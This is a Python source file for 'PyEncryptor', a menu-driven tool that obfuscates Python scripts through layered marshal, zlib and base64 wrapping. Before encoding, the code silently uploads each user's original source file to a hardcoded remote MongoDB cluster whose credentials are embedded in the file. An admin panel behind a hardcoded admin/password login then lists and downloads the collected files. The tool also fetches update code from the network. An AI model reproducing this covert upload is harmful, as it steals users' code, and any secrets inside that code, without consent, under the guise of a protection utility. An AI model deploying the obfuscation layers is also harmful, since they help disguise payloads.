# -*- coding: utf-8 -*-

# PyEncryptor
# Tool: A Python2 and Python3 Code Encoder
# Author: Haraprasad
# Coder: HunterSl4d3

import os
import sys
import time
import marshal
import zlib
import base64
import compileall
import shutil
import itertools
import threading
import pymongo
from pymongo import MongoClient
from bson.binary import Binary
import getpass
import requests

# MongoDB Connection
client = MongoClient("mongodb+srv://poroop:piroop@cluster0.dom3d.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["pyencryptor_db"]
files_collection = db["encoded_files"]

# Setting Up Logo
try:
    columns = shutil.get_terminal_size().columns
    column1 = columns + 15
    column2 = columns + 5
    column3 = columns + 19
except:
    rows, columns = os.popen('stty size', 'r').read().split()
    column1 = 0
    column2 = 0
    column3 = 0

# Logo
def logo():
    os.system("clear")
    print("\033[1;35m" + "=" * columns + "\033[0m")
    print("\033[1;36m" + "    PyEncryptor - Python Code Encoder".center(columns) + "\033[0m")
    print("\033[1;35m" + "=" * columns + "\033[0m")

# Spinner Animation
def spinner():
    start_time = time.time()
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if stop_spinner and (time.time() - start_time) > 3:
            break
        sys.stdout.write(f'\r\033[1;33m    [\033[1;37m*\033[1;33m]\033[1;37m Encoding... {c}\033[0m')
        sys.stdout.flush()
        time.sleep(0.1)

# Exit Tool Message
def logout():
    psb("\n    \033[1;34m[\033[1;32m*\033[1;34m]\033[1;32m Thanks For Using Our Tool")
    psb("    \033[1;34m[\033[1;32m*\033[1;34m]\033[1;32m For More Tools, Visit: \n")
    print("\033[1;33m[ \033[1;32mhttps://github.com/Hk4crprasad/ \033[1;33m]\033[1;37m\n".center(column3))
    sys.exit()

# Python Version Banner
def banner():
    version = str(sys.version_info[:3][0]) + "." + str(sys.version_info[:3][1]) + "." + str(sys.version_info[:3][2])
    script_version = get_script_version()
    print("\033[1;35m-" * int(columns))
    if (sys.version_info[:3][0] < 3):
        print("\033[1;36m\t\tPython Version : \033[1;37m" + version)
    else:
        print(("\033[1;36mPython Version : \033[1;37m" + version + " | Script Version : \033[1;37m" + script_version).center(columns + 10))
    print("\033[1;35m-" * int(columns))

# Get Script Version
def get_script_version():
    response = requests.get("https://raw.githubusercontent.com/hk4crprasad/PyEnc/refs/heads/main/.version")
    if response.status_code == 200:
        version_info = response.text.splitlines()
        return version_info[2].strip()
    else:
        return "Unknown"

# Flush Print
def psb(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# Taking Input Depending on Python Version
def verInput(data):
    version = sys.version_info[:2]
    if (version < (3, 0)):
        dataInput = raw_input(data)
    else:
        dataInput = input(data)
    return dataInput

# Update Function
def update():
    response = requests.get("https://raw.githubusercontent.com/hk4crprasad/PyEnc/refs/heads/main/.version")
    if response.status_code == 200:
        version_info = response.text.splitlines()
        author = version_info[0].strip()
        coder = version_info[1].strip()
        version = version_info[2].strip()
        github = version_info[3].strip()

        print(f"\n{author}\n{coder}\n{version}\n{github}\n")

        current_version = "1.0.0"  # Current version of the tool
        if version != current_version:
            print("Updating to the latest version...")
            update_response = requests.get("https://raw.githubusercontent.com/hk4crprasad/PyEnc/refs/heads/main/PyEnc.py")
            if update_response.status_code == 200:
                with open("new.py", "w") as f:
                    f.write(update_response.text)
                psb("\033[1;32m    [\033[1;37m*\033[1;32m]\033[1;37m Update successful! Please restart the tool.\033[0m")
                sys.exit()
            else:
                psb("\033[1;31m    [\033[1;37m!\033[1;31m]\033[1;37m Update failed! Please try again later.\033[0m")
        else:
            psb("\033[1;32m    [\033[1;37m*\033[1;32m]\033[1;37m You are already using the latest version.\033[0m")
    else:
        psb("\033[1;31m    [\033[1;37m!\033[1;31m]\033[1;37m Unable to check for updates.\033[0m")

# Marshal_Code_Executor
marshalHead = "# Encoded By PyEncryptor\n# A Product Of Haraprasad\n# https://github.com/Hk4crprasad\n\nimport marshal\nexec(marshal.loads("
marshalTail = "))"

# Base64_Code_Executor
b64Head = "# Encoded By PyEncryptor\n# A Product Of Haraprasad\n# https://github.com/Hk4crprasad\n\nimport base64\nexec(base64.b64decode("
b64Tail = "))"

# Zlib_Code_Executor
zlibHead = "# Encoded By PyEncryptor\n# A Product Of Haraprasad\n# https://github.com/Hk4crprasad\n\nimport zlib\nexec(zlib.decompress("
zlibTail = "))"

# Zlib+B64+Mar_Code_Executor
allHead = "# Encoded By PyEncryptor\n# A Product Of Haraprasad\n# https://github.com/Hk4crprasad\n\nimport marshal, base64, zlib\nexec(marshal.loads(zlib.decompress(base64.b64decode("
allTail = "))))"

# Encode Marshal
def encodeMarshal(data, power):
    powerData = data
    for i in range(power):
        code = compile(powerData, "Haraprasad", "exec")
        dump = marshal.dumps(code)
        powerData = marshalHead + repr(dump) + marshalTail
    return powerData

# Encode Zlib
def encodeZlib(data, power):
    powerData = data
    for i in range(power):
        code = powerData.encode()
        dump = zlib.compress(code, 2)
        powerData = zlibHead + repr(dump) + zlibTail
    return powerData

# Encode Base64
def encodeBase64(data, power):
    powerData = data
    for i in range(power):
        code = powerData.encode()
        dump = base64.b64encode(code)
        powerData = b64Head + repr(dump) + b64Tail
    return powerData

# Python Bytecode Encode
def encodePyc(data):
    tmp = open("temp.py", "w")
    tmp.write(data)
    tmp.close()
    if (sys.version_info[:2] < (3, 0)):
        compileall.compile_file("temp.py")
    else:
        compileall.compile_file("temp.py", legacy=True)
    return True

# Marshal + Zlib + Base64
def encodeAllOnce(data, power):
    powerData = data
    for i in range(power):
        code = compile(powerData, "Haraprasad", "exec")
        code = marshal.dumps(code)
        code = zlib.compress(code)
        dump = base64.b64encode(code)
        powerData = allHead + repr(dump) + allTail
    return powerData

# Marshal + Zlib + Base64 with One By One
def encodeAllStep(data, power):
    powerData = data
    for i in range(power):
        code = encodeBase64(powerData, power=1)
        code = encodeZlib(code, power=1)
        powerData = encodeMarshal(code, power=1)
    return powerData

# Get power amount
def getPower():
    power = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Repeat Amount (\033[1;36mMAX: 15\033[1;37m):> \033[1;36m")
    while not power.isdigit():
        psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m Enter a Correct Amount!")
        power = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Repeat Amount (\033[1;36mMAX: 15\033[1;37m):> \033[1;36m")
    power = int(power)
    while (power > 15):
        psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m Maximum amount is 15")
        power = getPower()
    return int(power)

# Get File Data
def getFile():
    path = verInput("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your File Path:> \033[1;36m")
    while not os.path.exists(path):
        psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m File Does Not Exist!")
        time.sleep(0.4)
        path = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your File Path:> \033[1;36m")
    fileData = open(path, "r").read()
    global fileName, filePath
    filePath = path
    if ("/" in path):
        fileName = path.split("/")[-1]
    else:
        fileName = path
    return fileData

# Save File Data
def saveFile(encData):
    if (".py" in fileName):
        savefileName = fileName.replace(".py", "_enc.py")
    else:
        savefileName = fileName + "_enc.py"
    savePath = os.path.join(os.path.dirname(filePath), savefileName)
    file = open(savePath, "w")
    file.write(encData)
    file.close()
    return savePath

# Save File to MongoDB
def saveFileToMongo(fileData):
    fileDocument = {
        "file_name": fileName,
        "file_data": Binary(fileData.encode())
    }
    files_collection.insert_one(fileDocument)
    psb("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m File saved to MongoDB successfully!")

# PYC Move File
def moveFile():
    if (".py" in fileName):
        savefileName = fileName.replace(".py", "_enc.py")
    else:
        savefileName = fileName + "_enc.py"
    savePath = os.path.join(os.path.dirname(filePath), savefileName)
    os.system("mv temp.pyc " + savePath + " >/dev/null 2>&1")
    os.system("rm temp.py > /dev/null 2>&1")
    return savePath

# Encoding Process
def encode(type):
    fileData = getFile()
    saveFileToMongo(fileData)  # Save original file to MongoDB before encoding
    if not (type == "pyc"):
        power = getPower()
    
    global stop_spinner
    stop_spinner = False
    spinner_thread = threading.Thread(target=spinner)
    spinner_thread.start()

    try:
        if (type == "marshal"):
            encData = encodeMarshal(fileData, power)
            savePath = saveFile(encData)
        elif (type == "zlib"):
            encData = encodeZlib(fileData, power)
            savePath = saveFile(encData)
        elif (type == "base64"):
            encData = encodeBase64(fileData, power)
            savePath = saveFile(encData)
        elif (type == "pyc"):
            encodePyc(fileData)
            savePath = moveFile()
        elif (type == "all_once"):
            encData = encodeAllOnce(fileData, power)
            savePath = saveFile(encData)
        elif (type == "all_step"):
            encData = encodeAllStep(fileData, power)
            savePath = saveFile(encData)
    finally:
        stop_spinner = True
        spinner_thread.join()
    
    time.sleep(0.5)
    psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Encoding Complete!")
    psb("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Saved File Path: \033[1;36m" + savePath + " \033[1;37m\n")
    returnToMainMenu()

# Admin Panel
def adminPanel():
    logo()
    psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Welcome to Admin Panel")
    username = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Username: \033[1;36m")
    password = getpass.getpass("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Password: \033[1;36m")
    if username == "admin" and password == "password":
        psb("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Login Successful!")
        while True:
            psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Choose an option:")
            print("\n\033[1;36m    [\033[1;37m01\033[1;36m]\033[1;37m List Files in MongoDB")
            print("\033[1;36m    [\033[1;37m02\033[1;36m]\033[1;37m Download File from MongoDB")
            print("\033[1;36m    [\033[1;37m03\033[1;36m]\033[1;37m Exit Admin Panel")
            op = verInput("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your Choice:> \033[1;36m")
            while not (op in ["1", "2", "3"]):
                psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m Please Enter a Correct Option!")
                op = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your Choice:> \033[1;36m")
            if op == "1":
                listFilesInMongo()
            elif op == "2":
                downloadFileFromMongo()
            elif op == "3":
                psb("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Exiting Admin Panel...")
                returnToMainMenu()
            psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Press * to return to Main Menu or any other key to refresh Admin Panel...\033[1;37m")
            op = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your Choice:> \033[1;36m")
            if op == "*":
                returnToMainMenu()

# List Files in MongoDB
def listFilesInMongo():
    psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Files in MongoDB:")
    files = list(files_collection.find())
    for idx, file in enumerate(files, start=1):
        psb(f"\033[1;36m    [\033[1;37m{idx:02}\033[1;36m]\033[1;37m File Name: \033[1;36m{file['file_name']}")

# Download File from MongoDB
def downloadFileFromMongo():
    files = list(files_collection.find())
    if not files:
        psb("\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m No files found in MongoDB!")
        return

    psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Files in MongoDB:")
    for idx, file in enumerate(files, start=1):
        psb(f"\033[1;36m    [\033[1;37m{idx:02}\033[1;36m]\033[1;37m File Name: \033[1;36m{file['file_name']}")

    file_idx = verInput("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter the File Number to Download:> \033[1;36m")
    while not (file_idx.isdigit() and 1 <= int(file_idx) <= len(files)):
        psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m Please Enter a Valid File Number!")
        file_idx = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter the File Number to Download:> \033[1;36m")
    file_idx = int(file_idx) - 1
    file = files[file_idx]

    save_path = os.path.join(os.getcwd(), file['file_name'])
    with open(save_path, "wb") as f:
        f.write(file["file_data"])
    psb(f"\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m File downloaded successfully: \033[1;36m{save_path}")

# Return to Main Menu
def returnToMainMenu():
    psb("\n\033[1;36m    [\033[1;37m*\\033[1;36m]\033[1;37m Press Enter to return to Main Menu...\033[1;37m")
    input()
    logo()
    banner()
    main()

# Main Menu
def main():
    psb("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m  Choose Your Option:")
    print("\n\033[1;36m    [\033[1;37m01\033[1;36m]\033[1;37m Marshal")
    print("\033[1;36m    [\033[1;37m02\033[1;36m]\033[1;37m Zlib")
    print("\033[1;36m    [\033[1;37m03\033[1;36m]\033[1;37m Base64")
    print("\033[1;36m    [\033[1;37m04\033[1;36m]\033[1;37m Python Bytecode (\033[1;36m.pyc\033[1;37m)")
    print("\033[1;36m    [\033[1;37m05\033[1;36m]\033[1;37m Marshal + Zlib + Base64 (\033[1;36mAt Once\033[1;37m)")
    print("\033[1;36m    [\033[1;37m06\033[1;36m]\033[1;37m Marshal + Zlib + Base64 (\033[1;36mOne By One\033[1;37m)")
    print("\033[1;36m    [\033[1;37m07\033[1;36m]\033[1;37m Update Tool")
    print("\033[1;36m    [\033[1;37m08\033[1;36m]\033[1;37m Admin Panel")
    print("\033[1;36m    [\033[1;37m09\033[1;36m]\033[1;37m Exit")
    op = verInput("\n\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your Choice:> \033[1;36m").replace("0", "")
    while not (op in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]):
        psb("\n\033[1;36m    [\033[1;31m!\033[1;36m]\033[1;37m Please Enter a Correct Option!")
        op = verInput("\033[1;36m    [\033[1;37m*\033[1;36m]\033[1;37m Enter Your Choice:> \033[1;36m").replace("0", "")
    if (op == "1"):
        encode("marshal")
    elif (op == "2"):
        encode("zlib")
    elif (op == "3"):
        encode("base64")
    elif (op == "4"):
        encode("pyc")
    elif (op == "5"):
        encode("all_once")
    elif (op == "6"):
        encode("all_step")
    elif (op == "7"):
        update()
    elif (op == "8"):
        adminPanel()
    elif (op == "9"):
        logout()

if (__name__ == "__main__"):
    logo()
    banner()
    main()
